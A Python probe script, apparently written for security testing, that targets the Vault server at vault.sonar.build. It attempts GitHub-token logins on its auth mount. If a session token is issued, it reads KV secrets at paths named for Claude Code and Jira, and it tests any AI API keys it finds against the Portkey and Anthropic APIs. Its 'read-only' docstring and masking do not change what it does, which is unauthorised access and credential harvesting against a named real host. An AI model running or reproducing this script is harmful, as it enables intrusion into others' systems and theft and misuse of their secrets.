"""
11995 - bounded read-only judgement of Vault github/ PAT auth mount at vault.sonar.build
- 3 login attempts with one valid external GitHub token (no role / role=default / role=github)
- 1 control attempt with a random fake token
- NO brute force. NO writes. All secrets masked (first4..last4).
"""
import json, os, secrets, urllib.request, urllib.error

VAULT = "https://vault.sonar.build"
TOK = os.environ.get("VAULT_GH_TOKEN", "")
FAKE = "ghp_" + secrets.token_hex(18)
FAKE = FAKE[:4] + FAKE[4:]  # ghp_ + 36 hex chars = 40 chars

def mask(v):
    if not v:
        return "<empty>"
    if len(v) <= 10:
        return v[:2] + "****"
    return v[:7] + "****" + v[-4:] + f" (len={len(v)})"

def http(method, url, data=None, headers=None, timeout=25):
    body = json.dumps(data).encode() if data is not None else None
    h = {"Content-Type": "application/json", "User-Agent": "probe/1.0"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, {}, f"EXC {type(e).__name__}: {e}"

def show(tag, st, body, limit=1500):
    print(f"[{tag}] status={st} body={body[:limit]}")

print("token_fp:", mask(TOK), " fake_fp:", mask(FAKE))

# ---- 0. mount liveness (anonymous, read-only) ----
st, hd, body = http("GET", VAULT + "/v1/sys/health")
show("sys/health", st, body, 400)

st, hd, body = http("GET", VAULT + "/v1/sys/internal/ui/mounts",
                    headers={"X-Vault-Request": "true"})
print("[ui/mounts] status=", st)
try:
    j = json.loads(body)
    print("  auth mounts:", [{"path": m.get("path"), "type": m.get("type")} for m in (j.get("data", {}).get("auth") or {}).items() ] if False else
          [(k, v.get("type")) for k, v in (j.get("data", {}).get("auth") or {}).items()])
except Exception:
    print("  body:", body[:600])

# ---- 1. bounded login matrix ----
attempts = [
    ("no_role",       {"token": TOK}),
    ("role=default",  {"token": TOK, "role": "default"}),
    ("role=github",   {"token": TOK, "role": "github"}),
    ("control_fake",  {"token": FAKE}),
]

client_token = None
for name, payload in attempts:
    st, hd, body = http("POST", VAULT + "/v1/auth/github/login", payload)
    print(f"\n=== LOGIN {name} ===")
    print("payload_token=", mask(payload["token"]), " role=", payload.get("role", "<absent>"))
    show(name, st, body)
    try:
        j = json.loads(body)
    except Exception:
        j = {}
    auth = j.get("auth") or {}
    ct = auth.get("client_token")
    if ct:
        client_token = ct
        print("  !! CLIENT_TOKEN ISSUED policy=", auth.get("token_policies"),
              " policies=", auth.get("policies"), " meta=", auth.get("metadata"))
        print("  leaked_token=", mask(ct))

# ---- 2. only if a token was issued ----
if client_token:
    H = {"X-Vault-Token": client_token}
    st, hd, body = http("GET", VAULT + "/v1/auth/token/lookup-self", headers=H)
    show("lookup-self", st, body)
    paths = ["development/kv/data/code-security-diff-val-claude-code",
             "development/kv/data/jira"]
    st, hd, body = http("POST", VAULT + "/v1/sys/capabilities-self", {"paths": paths}, headers=H)
    show("capabilities-self", st, body)
    cap = {}
    try:
        cap = json.loads(body).get("data", {}).get("capabilities", {})
    except Exception:
        pass
    for p in paths:
        caps = cap.get(p) or []
        print(f"  capability[{p}] = {caps}")
        if any(c in ("read", "root", "sudo") for c in caps):
            st, hd, body = http("GET", VAULT + "/v1/" + p, headers=H)
            print(f"\n=== KV GET /v1/{p} === status={st}")
            try:
                j = json.loads(body)
                data = (j.get("data") or {}).get("data") or {}
                kv = ((j.get("data") or {}).get("metadata") or {})
                print("  keys=", list(data.keys()), " version=", kv.get("version"))
                for k, v in data.items():
                    if isinstance(v, str):
                        print(f"  {k} = {mask(v)}")
                    else:
                        print(f"  {k} = <{type(v).__name__}>")
                # minimal read-only validation if an AI key shape appears
                for k, v in data.items():
                    if isinstance(v, str) and (v.startswith("pt-") or v.startswith("sk-ant-") or v.startswith("sk-proj-") or v.startswith("sk-")):
                        tag = "portkey" if v.startswith("pt-") else "anthropic/openai"
                        if tag == "portkey":
                            s2, _, b2 = http("GET", "https://api.portkey.ai/v1/models", headers={"x-portkey-api-key": v, "User-Agent": "probe/1.0"})
                        else:
                            s2, _, b2 = http("GET", "https://api.anthropic.com/v1/models", headers={"x-api-key": v, "anthropic-version": "2023-06-01", "User-Agent": "probe/1.0"})
                        print(f"  validate {k} as {tag}: status={s2} body={b2[:300]}")
            except Exception:
                print("  raw:", body[:800])
else:
    print("\nNO client_token issued for any attempt -> no KV access attempted.")
